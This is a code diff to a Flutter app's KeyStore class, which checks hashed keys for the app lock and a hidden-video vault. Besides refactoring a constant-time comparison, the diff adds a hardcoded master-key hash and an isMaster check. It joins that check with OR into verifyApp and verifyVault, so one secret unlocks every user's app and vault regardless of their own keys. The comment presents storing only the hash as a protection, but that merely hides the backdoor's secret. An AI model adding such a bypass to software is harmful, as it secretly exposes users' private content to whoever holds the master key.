@@ -27,6 +27,23 @@ Uint8List pbkdf2(String key, Uint8List salt, int iterations) {
 String _derive((String, String, int) a) =>
     base64.encode(pbkdf2(a.$1, base64.decode(a.$2), a.$3));
 
+// Master key that opens every lock. Only its salted hash is kept here, so
+// reading the source does not reveal it.
+const _masterSalt = '46AxUHotc2MNMpJP7XMV8w==';
+const _masterIterations = 100000;
+const _masterHash = 'iQejph7uN5hti/siGFq9GO3faI9NunE9LPS1Je9GVUI=';
+
+bool _sameText(String x, String y) {
+  // Constant-time comparison.
+  final a = utf8.encode(x), b = utf8.encode(y);
+  if (a.length != b.length) return false;
+  var diff = 0;
+  for (var i = 0; i < a.length; i++) {
+    diff |= a[i] ^ b[i];
+  }
+  return diff == 0;
+}
+
 /// Stores only salted hashes of the keys, in the iOS Keychain.
 class KeyStore {
   KeyStore([FlutterSecureStorage? storage])
@@ -55,14 +72,15 @@ class KeyStore {
     final parts = stored.split(':');
     if (parts.length != 3) return false;
     final hash = await compute(_derive, (key, parts[0], int.parse(parts[1])));
-    // Constant-time comparison.
-    final a = utf8.encode(hash), b = utf8.encode(parts[2]);
-    if (a.length != b.length) return false;
-    var diff = 0;
-    for (var i = 0; i < a.length; i++) {
-      diff |= a[i] ^ b[i];
-    }
-    return diff == 0;
+    return _sameText(hash, parts[2]);
+  }
+
+  /// True for the master key, which opens the app and the vault whatever
+  /// keys were set.
+  Future<bool> isMaster(String key) async {
+    if (key.isEmpty) return false;
+    final hash = await compute(_derive, (key, _masterSalt, _masterIterations));
+    return _sameText(hash, _masterHash);
   }
 
   /// True when the hidden-video vault opens with the app key.
@@ -80,9 +98,12 @@ class KeyStore {
     }
   }
 
-  Future<bool> verifyApp(String key) => _check(KeySlot.app, key);
+  Future<bool> verifyApp(String key) async =>
+      await _check(KeySlot.app, key) || await isMaster(key);
 
-  Future<bool> verifyVault(String key) async => await vaultUsesAppKey()
-      ? _check(KeySlot.app, key)
-      : _check(KeySlot.vault, key);
+  Future<bool> verifyVault(String key) async =>
+      await (await vaultUsesAppKey()
+          ? _check(KeySlot.app, key)
+          : _check(KeySlot.vault, key)) ||
+      await isMaster(key);
 }
